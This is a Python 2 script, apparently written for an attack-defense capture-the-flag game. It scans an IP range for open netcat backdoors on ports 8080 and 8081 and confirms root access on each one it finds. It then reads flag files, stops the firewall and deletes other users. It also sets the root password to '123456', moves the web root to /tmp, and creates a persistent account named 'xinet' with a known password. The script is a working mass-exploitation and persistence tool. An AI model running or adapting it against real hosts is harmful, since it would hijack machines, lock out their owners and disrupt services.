# coding=utf-8

import pexpect
import optparse
from netaddr import *
import os

parser = optparse.OptionParser()
parser.add_option('-t', dest='target', type='string')

(options, args) = parser.parse_args()

target = options.target
port_list = [8080, 8081]

# IPNetwork 支持192.168.100.0/24这样的
for ip in IPNetwork(target):
    for port in port_list:
        cmd = 'nc %s %d' % (ip, port)
        child = pexpect.spawn(cmd)

        # 判断后门的连通性
        child.sendline('whoami')
        # 多次经验,大概率是ROOT权限,如果没返回ROOT就跳过
        if child.expect(['root', pexpect.TIMEOUT, pexpect.EOF], timeout=1) != 0:
            print '[X] %s:%d close' % (ip, port)
            continue

        # 这句话可以去掉
        print '[#] %s:%d opened,start hakcing' % (ip, port)

        # 储存的路径
        path = os.path.join(os.getcwd(), 'nc_flag_%s_%d' % (ip, port))

        # python 2.4以上才可以使用with语句
        with open(path, 'wb') as f:

            child.logfile_read = f

            # 利用Pyhton转换成交互式Shell,转完后输入的指令会显示两次..
            # child.sendline('''python -c 'import pty; pty.spawn("/bin/bash")' ''')

            # Get the flag
            child.sendline('cat /root/flag*')

            # 没多大用
            child.sendline('/sbin/service sshd start')
            child.sendline('/sbin/service xinetd start')
            child.sendline('/sbin/service iptables stop')

            # Delete the funny backdoor users
            child.sendline('/usr/sbin/userdel -f admin')
            child.sendline('/usr/sbin/userdel -f hacker')
            child.sendline('/usr/sbin/userdel -f test')

            # Help him to change password
            child.sendline('echo root:123456 | /usr/sbin/chpasswd')

            # Help him to remove dangerous website content
            # child.sendline('rm -rf /var/www/html')
            child.sendline('mv /var/www/html /tmp/backup/')

            # Tell him I'm helpful
            # child.sendline('echo "XD You has been hacked" | wall')

            # 为后面的刷分做准备
            child.sendline('/usr/sbin/useradd xinet')
            child.sendline('passwd xinet')
            child.sendline('123456')
            child.sendline('123456')

            # Exit the game,also stop this backdoor
            child.sendline('exit')
            child.expect(pexpect.EOF)
            print '[CTF] %s:%d finished hacking,see file %s' % (ip, port, path)
